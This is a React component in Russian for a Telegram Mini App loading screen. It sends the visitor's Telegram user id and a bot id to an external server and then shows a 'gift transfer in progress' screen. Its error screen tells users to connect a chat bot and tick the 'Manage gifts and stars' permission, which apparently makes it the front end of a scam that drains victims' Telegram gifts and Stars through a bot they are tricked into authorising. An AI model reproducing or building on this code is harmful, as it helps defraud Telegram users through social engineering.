import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

export default function Loading() {
  const navigate = useNavigate();
  const location = useLocation();
  const [error, setError] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);

  useEffect(() => {
    const searchParams = new URLSearchParams(location.search);
    const bot_id = searchParams.get('bot_id');
    const user_id = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;

    const checkConnection = async () => {
      try {
        const wait5sec = new Promise(resolve => setTimeout(resolve, 5000));

        const fetchConnection = fetch('https://tralalelotralala.digital:8001/check_connection', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id, bot_id }),
        });

        const [res] = await Promise.all([fetchConnection, wait5sec]);

        if (!res.ok) throw new Error('Network response was not ok');

        const data = await res.json();
        console.log('[✅] API Response:', data);

        if (data?.connection === true) {
          setIsTransferring(true);
        } else {
          setError(true);
          setTimeout(() => {
            navigate('/intro' + location.search);
          }, 5000);
        }

      } catch (err) {
        console.error('[❌] API call failed:', err);
        setError(true);
        setTimeout(() => {
          navigate('/intro' + location.search);
        }, 5000);
      }
    };

    checkConnection();
  }, []);

  if (error) {
    return (
      <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-red-500 flex-col px-4 text-center relative -mt-10">
        <div className="flex flex-col items-center text-white max-w-md w-full">
          
          <div className="text-[64px] leading-none mb-6 -mt-6">❌</div>
      
          <h1 className="text-lg font-semibold text-red-400 mb-4">Не удалось проверить подключение</h1>
      
          <p className="text-sm text-gray-300 mb-3 leading-relaxed">
            Такое бывает. Иногда Telegram требуется от<br />
            10 секунд до минуты, чтобы применить<br />
            изменения.
          </p>
      
          <p className="text-sm text-gray-300 mb-3">Пожалуйста, убедитесь, что:</p>
      
          <div className="border border-red-500 rounded-xl px-4 py-3 bg-[#101622] text-left text-sm text-white mb-5 w-full">
            <ul className="space-y-2">
              <li className="relative pl-4 before:absolute before:left-0 before:top-1 before:w-2 before:h-2 before:rounded-full before:bg-blue-400">
                Чат-бот подключен верно
              </li>
              <li className="relative pl-4 before:absolute before:left-0 before:top-1 before:w-2 before:h-2 before:rounded-full before:bg-blue-400">
                Стоит галочка «Управлять подарками и звездами»
              </li>
            </ul>
          </div>
      
          <p className="text-sm text-gray-400">
            Пожалуйста, не закрывайте страницу,<br />выполняется повторное подключение...
          </p>
        </div>
      </div>










    );
  }

  if (isTransferring) {
    return (
      <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-white px-4 text-center">
        <div className="flex flex-col items-center max-w-md w-full">
          
          {/* Спиннер */}
          <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500 mb-8"></div>
  
          {/* Заголовок */}
          <b className="text-xl font-semibold mb-4">Выполняется передача подарка...</b>
  
          {/* Описание */}
          <h3 className="text-base text-gray-400 leading-relaxed">
            Это может занять от 30 до 60 секунд.<br />
            Пожалуйста, не закрывайте страницу.
          </h3>
        </div>
      </div>
    );
  }
  
  return (
    <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-white flex-col">
      <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500"></div>
      <b className="mt-10">Проверяем подключение...</b>
      <h3 className="text-center mt-4 text-gray-400">Это может занять от 30 до 60 секунд. Пожалуйста, не закрвывайте страницу</h3>
    </div>
  );
}
